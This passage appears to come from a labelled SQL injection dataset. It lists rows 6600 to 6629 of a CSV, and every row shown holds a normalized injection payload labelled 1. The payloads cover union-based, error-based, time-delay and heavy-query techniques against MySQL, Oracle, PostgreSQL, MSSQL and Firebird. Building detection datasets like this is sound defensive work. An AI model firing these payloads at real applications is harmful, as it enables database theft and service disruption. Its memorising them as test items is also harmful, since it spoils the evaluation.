row_index,payload_norm,label,sqli_type_hint
6600,"-5732' ) union all select 7614,7614,7614,7614--",1,
6601,"1"" union all select null,null,null,null,null--",1,
6602,-4157' ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 'rdhm' = 'rdhm,1,
6603,"-7412"" ) as qngt where 2041 = 2041 union all select 2041--",1,
6604,"-8673"" ) or make_set ( 9354 = 9354,7185 ) and ( ""edap"" like ""edap",1,
6605,"1"" order by 1--",1,
6606,"-4721' ) or elt ( 4378 = 5165,5165 ) and ( 'fufn' = 'fufn",1,
6607,"1 ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 2748 = 2748",1,
6608,"1"" ) where 9648 = 9648 and elt ( 1210 = 1210,sleep ( 5 ) ) --",1,
6609,"1"" ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""fpwu"" like ""fpwu",1,
6610,"-5294%"" ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ""%"" = """,1,
6611,"1 ) where 2741 = 2741 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
6612,"1, ( select * from generate_series ( 9108,9108,case when ( 9108 = 2900 ) then 1 else 0 end ) limit 1 )",1,
6613,"-3620'|| ( select 'kmei' where 8533 = 8533 union all select 8533,8533,8533,8533--",1,
6614,"1' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'ibdj' = 'ibdj",1,
6615,-9327' ) or 3038 = 3038,1,
6616,"-9829' ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
6617,begin user_lock.sleep ( 5 ),1,
6618,"1"" ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
6619,"1' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'toft' = 'toft",1,
6620,"1' where 1602 = 1602 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1,
6621,1 ) where 9167 = 9167,1,
6622,"1"" ) as dien where 4022 = 4022",1,
6623,1 ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,
6624,"-1083%"" ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( ""%"" = """,1,
6625,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ""dwbh"" like ""dwbh",1,
6626,"-9197%"" ) ) ) union all select 1040,1040,1040,1040,1040,1040,1040,1040,1040#",1,
6627,"1%"" ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""%"" = """,1,
6628,1'|| ( select 'tezo' from dual where 4436 = 4436,1,
6629,"-8684 union all select 9519,9519,9519,9519--",1,
